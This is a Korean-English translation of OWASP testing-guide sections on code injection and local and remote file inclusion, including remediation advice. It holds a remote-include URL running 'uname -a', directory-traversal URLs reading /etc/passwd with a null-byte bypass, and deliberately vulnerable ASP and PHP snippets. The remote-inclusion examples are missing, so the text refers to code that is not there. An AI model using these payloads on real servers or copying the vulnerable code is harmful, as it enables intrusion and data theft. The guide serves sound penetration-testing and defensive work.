============================================================================================
OTG-INPVAL-012 (코드 인젝션 침투 테스트)
============================================================================================

|

개요
============================================================================================

이 섹션은 테스터가 웹 서버에 의해 실행되거나 웹 페이지에 코드를 삽입할 수 있는 지 확인하는 방법을 설명합니다.
코드 인젝션 테스트는 동적 코드 또는 포함된 파일로 웹 서버에 의해 처리할 입력을 제출합니다.
이 테스트는 다양한 서버 사이드 스크립트 엔진(ASP 또는 PHP)을 대상으로 할 수 있습니다.
적절한 입력 유효성 검사와 보안 코딩 연습은 이러한 공격을 방지하기 위해 공부할 필요가 있습니다.

|

테스트 방법
============================================================================================

|

Black Box testing
---------------------------------------------------------------------------------------

PHP 인젝션 취약점 테스트
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

쿼리 스트링을 사용하여 테스터는 포함된 파일의 일부로 처리할 코드를 삽입할 수 있습니다.


**예상결과**

.. code-block:: html

    http://www.example.com/uptime.php?pin=http://www.
    example2.com/packx1/cs.jpg?&cmd=uname%20-a


악성 URL은 PHP 페이지의 파라미터로서 받아들여지고, 이 후 포함된 파일의 값을 사용할 것입니다.

|

Gray Box testing
---------------------------------------------------------------------------------------

ASP 인젝션 취약점 테스트
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

사용자 입력 ASP 코드 중 실행 함수를 사용하는 지 검사합니다.
사용자가 데이터 입력 필드에 명령을 입력할 수 있는지 확인합니다.

파일로 입력 값을 저장하여 실행하는 ASP 코드:

.. code-block:: html

    <%
    If not isEmpty(Request( "Data" ) ) Then
    Dim fso, f
    'User input Data is written to a file named data.txt
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
    f.Write Request("Data") & vbCrLf
    f.close
    Set f = nothing
    Set fso = Nothing
    'Data.txt is executed
    Server.Execute( "data.txt" )
    

.. code-block:: html

    Else
    %>
    <form>
    <input name="Data" />
    <input type="submit" name="Enter Data" />
    </form>
    <%
    End If
    %>)))

|

References
============================================================================================

- Security Focus: http://www.securityfocus.com
- Insecure.org: http://www.insecure.org
- Wikipedia: http://www.wikipedia.org
- OS Injection을 위한 코드 검토

|

|

============================================================================================
로컬 파일 인클루션 테스트
============================================================================================

개요
============================================================================================

로컬 파일 인클루션 취약점은 일반적으로 대상 어플리케이션에서 구현되는 "동적 파일 인클루션" 
메카니즘을 이용하여, 공격자가 파일을 포함 할 수 있습니다.
이 취약점으로 인해 적절한 검증없이 사용자가 제공한 입력 사용 때문에 발생합니다.


This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:

- 웹 서버에서 코드 실행
- XSS와 같이 또 다른 공격을 할 수 있는 자바스크립트와 같은 코드 실행
- DoS
- 민감한 정보 노출


Local File Inclusion (also known as LFI) is the process of including
files, that are already locally present on the server, through the
exploiting of vulnerable inclusion procedures implemented in the
application. 
This vulnerability occurs, for example, when a page
receives, as input, the path to the file that has to be included and
this input is not properly sanitized, allowing directory traversal
characters (such as dot-dot-slash) to be injected. 
Although
most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP,
ASP and others.

|

테스트 방법
============================================================================================

Since LFI occurs when paths passed to "include" statements are
not properly sanitized, in a blackbox testing approach, we should
look for scripts which take filenames as parameters.

다음 예를 살펴 보겠습니다.

.. code-block:: html

    http://vulnerable_host/preview.php?file=example.html

This looks as a perfect place to try for LFI. 

If an attacker is lucky enough, and instead of selecting the appropriate page from the 
array by its name, the script directly includes the input parameter,
it is possible to include arbitrary files on the server.

일반적인 개념 증명은 passwd 파일을 로드하는 것입니다.:

.. code-block:: html

    http://vulnerable_host/preview.php?file=../../../../etc/passwd

위에서 언급한 조건이 충족될 경우, 공격자는 아래와 같은 내용을 볼 수 있습니다.:

.. code-block:: html

    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    alex:x:500:500:alex:/home/alex:/bin/bash
    margo:x:501:501::/home/margo:/bin/bash
    ...


Very often, even when such vulnerability exists, its exploitation is a bit more complex. 

다음 코드 일부를 살펴 보겠습니다.


.. code-block:: html

    <?php "include/".include($_GET['filename'].".php"); ?>

접미사에 'PHP'가 추가될 경우, 임의의 파일 이름의 간단한 치환은 작동하지 않을 것입니다.

그것을 우회하기 위해서는 널 바이트 종료 문자가 사용됩니다.

%00는 문자열의 끝을 표시하기 때문에, 모든 문자는 이 특수 바이트 이후 무시될 것입니다.

따라서, 다음 요청 또한 공격자에게 기본 사용자 속성 리스트를 리턴할 것입니다.

.. code-block:: html

    http://vulnerable_host/preview.php?file=../../../../etc/passwd%00

|

References
============================================================================================

- Wikipedia: http://www.wikipedia.org/wiki/Local_File_Inclusion
- Hakipedia: http://hakipedia.com/index.php/Local_File_Inclusion

|

Remediation
============================================================================================

파일 인클루션 취약점을 제거하기 위한 가장 효율적인 방법은 파일 시스템 및 프레임워크 API에
사용자가 제공하는 입력이 지나가는 걸 피하는 것입니다.

만약 어플리케이션에서 위와 같은 설정이 불가능하다면, 파일의 화이트리스트를 유지, 선택한 파일에 대한 접근을 확인하는 식별자를 사용할 수 있습니다.

Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path.

|

|

============================================================================================
리모트 파일 인클루션 테스트
============================================================================================

개요
============================================================================================

파일 인클루션 취약점은 일반적으로 대상 어플리케이션에서 구현되는 "동적 파일 인클루션" 
메카니즘을 이용하여, 공격자가 파일을 포함 할 수 있습니다.
이 취약점으로 인해 적절한 검증없이 사용자가 제공한 입력 사용 때문에 발생합니다.

This can lead to something as outputting the contents of the file, 
but depending on the severity, it can also lead to:

- 웹 서버에서 코드 실행
- XSS와 같이 또 다른 공격을 할 수 있는 자바스크립트와 같은 코드 실행
- DoS
- 민감한 정보 노출

Remote File Inclusion (also known as RFI) is the process of including
remote files through the exploiting of vulnerable inclusion procedures
implemented in the application. 
This vulnerability occurs, for example, when a page receives, as input, 
the path to the file that has to be included and this input is not properly 
sanitized, allowing external URL to be injected. 
Although most examples point to vulnerable PHP scripts, we should keep in 
mind that it is also common in other technologies such as JSP, ASP and others.

|

테스트 방법
============================================================================================

Since RFI occurs when paths passed to "include" statements are not properly 
sanitized, in a blackbox testing approach, we should look for scripts which 
take filenames as parameters. 
Consider the following PHP example:

In this example the path is extracted from the HTTP request and no
input validation is done (for example, by checking the input against a
white list), so this snippet of code results vulnerable to this type of
attack. Consider infact the following URL:

In this case the remote file is going to be included and any code contained
in it is going to be run by the server.

|

References
============================================================================================

Whitepapers
------------------------------------------------------------------------------------

- "Remote File Inclusion": http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion
- Wikipedia: "Remote File Inclusion": http://en.wikipedia.org/wiki/Remote_File_Inclusion

|

Remediation
============================================================================================

The most effective solution to eliminate file inclusion vulnerabilities
is to avoid passing user-submitted input to any filesystem/framework
API. If this is not possible the application can maintain a white
list of files, that may be included by the page, and then use an identifier
(for example the index number) to access to the selected file. Any
request containing an invalid identifier has to be rejected, in this way
there is no attack surface for malicious users to manipulate the path.



